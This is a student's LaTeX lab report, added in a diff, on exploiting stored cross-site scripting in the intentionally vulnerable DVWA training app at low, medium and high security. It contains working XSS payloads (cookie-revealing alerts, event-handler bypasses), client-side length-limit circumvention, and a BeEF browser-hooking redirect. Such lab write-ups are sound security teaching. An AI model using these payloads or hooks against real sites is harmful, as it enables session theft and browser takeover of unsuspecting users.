@@ -1,0 +1,190 @@
+\documentclass[12pt]{article}
+\usepackage{graphicx}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{color}
+\usepackage{caption}
+\usepackage{float}
+\usepackage{amsmath}
+
+\lstdefinelanguage{Bash}{
+    keywords={cd, ls, tar, python, objdump, grep, Enter},
+    sensitive=false,
+    comment=[l]{\#},
+    morecomment=[s]{/*}{*/},
+    morestring=[b]',
+    morestring=[b]",
+}
+
+\lstdefinestyle{terminal}{
+    % Removed the recursive style reference
+    backgroundcolor=\color{black},
+    basicstyle=\footnotesize\color{white}\ttfamily,
+    keywordstyle=\color{cyan},
+    commentstyle=\color{green},
+    stringstyle=\color{yellow},
+    showstringspaces=false,
+    breaklines=true,
+    frame=single,
+    framerule=0pt,
+    rulecolor=\color{black},
+}
+
+\title{Stored Cross-Site Scripting Lab}
+\author{Abraham J. Reines}
+\date{\today}
+
+\begin{document}
+
+\maketitle
+
+\tableofcontents
+
+\newpage
+
+\section{Introduction}
+
+This report outlines the steps completed in the Stored Cross-Site Scripting (XSS) lab. 
+
+\section{Task 1: DVWA Stored XSS with Low Security}
+
+\subsection{Steps Taken}
+
+\begin{enumerate}
+    \item Logged into the Cyber Range and started the Cyber Basics Environment.
+    \item Logged into the Linux desktop using the credentials:
+    \begin{itemize}
+        \item Username: \texttt{student}
+        \item Password: \texttt{student}
+    \end{itemize}
+    \item Opened a web browser and navigated to \url{http://dvwa.example.com}.
+    \item Logged into DVWA using:
+    \begin{itemize}
+        \item Username: \texttt{admin}
+        \item Password: \texttt{password}
+    \end{itemize}
+    \item Set the DVWA Security Level to \textbf{Low}.
+    \item Selected the \textbf{XSS (Stored)} vulnerability from the left menu.
+    \item In the \textbf{Name} field, entered \texttt{Alice}.
+    \item In the \textbf{Message} field, entered \texttt{<h1>Hello World</h1>} and clicked \textbf{Sign Guestbook}.
+    \item Observed the message displayed as a heading.
+    \item In the \textbf{Name} field, entered \texttt{Alice}.
+    \item In the \textbf{Message} field, entered \texttt{<script>alert("Welcome to the Dark Side")</script>} and clicked \textbf{Sign Guestbook}.
+    \item Observed an alert box displaying the message.
+    \item In the \textbf{Name} field, entered \texttt{Alice}.
+    \item In the \textbf{Message} field, entered \texttt{<script>alert(document.cookie)</script>} and clicked \textbf{Sign Guestbook}.
+    \item Observed an alert box displaying the session cookie.
+    \item Navigated away and returned to the \textbf{XSS (Stored)} page to confirm the stored XSS.
+\end{enumerate}
+
+\subsection{Results}
+
+The application accepted the malicious scripts without sanitization leading to the execution of JavaScript code whenever the page was loaded. 
+
+\section{Task 2: DVWA Stored XSS on Medium Security}
+
+\subsection{Steps Taken}
+
+\begin{enumerate}
+    \item Changed the DVWA Security Level to \textbf{Medium}.
+    \item Navigated to the \textbf{XSS (Stored)} page.
+    \item Observed the \textbf{Name} field limited input to 10 characters.
+    \item Right-clicked on the \textbf{Name} input field and selected \textbf{Inspect Element}.
+    \item Modified the \texttt{maxlength} attribute from \texttt{10} to \texttt{100}.
+    \item In the \textbf{Name} field, entered \texttt{<body onload=alert("medium")>}.
+    \item In the \textbf{Message} field, entered \texttt{Hello}.
+    \item Clicked \textbf{Sign Guestbook}.
+    \item Observed an alert box displaying the message \texttt{"medium"}.
+    \item Navigated away and returned to confirm the stored XSS.
+\end{enumerate}
+
+\subsection{Code Modification}
+
+The following PHP code reflects the sanitization implemented at the medium security level:
+
+\begin{lstlisting}[style=terminal]
+<?php
+
+if (isset($_POST['btnSign'])) {
+    // Get input
+    $message = trim($_POST['mtxMessage']);
+    $name    = trim($_POST['txtName']);
+
+    // Sanitize message input
+    $message = strip_tags(addslashes($message));
+    $message = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $message);
+    $message = htmlspecialchars($message);
+
+    // Sanitize name input
+    $name = str_replace('<script>', '""', $name);
+    $name = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $name);
+
+    // Update database
+    $query  = "INSERT INTO guestbook (comment, name) VALUES ('$message', '$name');";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die('<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>');
+}
+
+?>
+\end{lstlisting}
+
+\subsection{Results}
+
+By bypassing client-side restrictions using alternative event handlers we executed a stored XSS attack at the medium security level.
+
+\section{Task 3: DVWA Stored XSS on High Security}
+
+\subsection{Steps Taken}
+
+\begin{enumerate}
+    \item Changed the DVWA Security Level to \textbf{High}.
+    \item Navigated to the \textbf{XSS (Stored)} page.
+    \item Clicked \textbf{View Source} to examine the sanitization measures.
+    \item Noted certain characters were filtered.
+    \item In the \textbf{Name} field, entered \texttt{<img src=1 onerror=alert(document.domain)>}.
+    \item In the \textbf{Message} field, entered \texttt{Test}.
+    \item Clicked \textbf{Sign Guestbook}.
+    \item Observed an alert box displaying the domain name.
+    \item Inspected the broken image icon to verify the stored code.
+\end{enumerate}
+
+\subsection{Results}
+
+By exploiting the \texttt{onerror} event handler in an \texttt{<img>} tag, executed a stored XSS attack even at the high security level. 
+
+\section{Task 4: Complete Stored XSS Using BeEF}
+
+\subsection{Steps Taken}
+
+\begin{enumerate}
+    \item Opened a terminal gaining root access by typing \texttt{sudo su}.
+    \item Updated the system using \texttt{apt update}.
+    \item Installed BeEF with \texttt{apt install beef-xss} confirmed with \texttt{Y}.
+    \item Changed the BeEF password by editing \texttt{/etc/beef-xss/config.yaml}.
+    \item Started BeEF by navigating to \texttt{/usr/share/beef-xss} running \texttt{./beef}.
+    \item Accessed BeEF's web interface at \url{http://127.0.0.1:3000/ui/authentication}.
+    \item Logged in using the username \texttt{beef} and the new password '\textbf{mynewpassword}'.
+    \item Copied the link to the advanced demo page from BeEF.
+    \item Returned to DVWA and set the Security Level to \textbf{Low}.
+    \item Navigated to the \textbf{XSS (Stored)} page.
+    \item Right-clicked on the \textbf{Message} input field, selected \textbf{Inspect Element}, and changed \texttt{maxlength} to \texttt{200}.
+    \item In the \textbf{Name} field, entered \texttt{Bob}.
+    \item In the \textbf{Message} field, entered:
+
+	\begin{lstlisting}[style=terminal]
+    {<script>document.location='http://127.0.0.1:3000/demos/butcher/index.html'</script>}
+    \end{lstlisting}
+
+    \item Clicked \textbf{Sign Guestbook}.
+    \item Observed the page redirected to BeEF demo page.
+    \item Confirmed browser was hooked in BeEF interface.
+\end{enumerate}
+
+\subsection{Results}
+
+By injecting a script which redirected the page to a BeEF-controlled site we demonstrated how attackers could exploit stored XSS vulnerabilities to gain control over a user's browser. 
+
+\section{Conclusion}
+
+Throughout this lab, we successfully exploited stored XSS vulnerabilities in DVWA at different security levels. 
+
+\end{document}
